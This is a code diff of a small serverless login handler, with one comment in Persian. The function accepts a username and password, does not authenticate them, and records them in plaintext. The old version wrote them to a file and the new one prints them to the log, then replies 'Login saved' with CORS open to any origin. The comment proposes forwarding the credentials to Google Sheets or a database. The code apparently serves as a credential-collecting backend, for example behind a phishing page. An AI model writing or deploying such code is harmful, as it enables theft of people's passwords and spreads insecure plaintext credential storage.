@@ -1,19 +1,19 @@
-const fs = require("fs");
-const path = require("path");
-
-exports.handler = async function(event, context) {
-  if (event.httpMethod !== "POST") {
-    return { statusCode: 405, body: "Method Not Allowed" };
-  }
-
-  const { username, password } = JSON.parse(event.body);
-  const logEntry = `Username: ${username}, Password: ${password}\n`;
-
-  const filePath = path.join("/tmp", "logins.txt");
-  fs.appendFileSync(filePath, logEntry);
-
-  return {
-    statusCode: 200,
-    body: JSON.stringify({ message: "Login saved" })
+exports.handler = async (event) => {
+    const data = JSON.parse(event.body);
+    const { username, password } = data;
+  
+    console.log("Login received:", username, password);
+  
+    // اینجا می‌تونی اطلاعات رو به Google Sheets، فایل، یا دیتابیس بفرستی
+    // فعلاً فقط لاگ می‌گیریم
+  
+    return {
+      statusCode: 200,
+      body: JSON.stringify({ message: "Login saved" }),
+      headers: {
+        "Access-Control-Allow-Origin": "*",
+        "Access-Control-Allow-Headers": "Content-Type",
+      },
+    };
   };
-};
+  
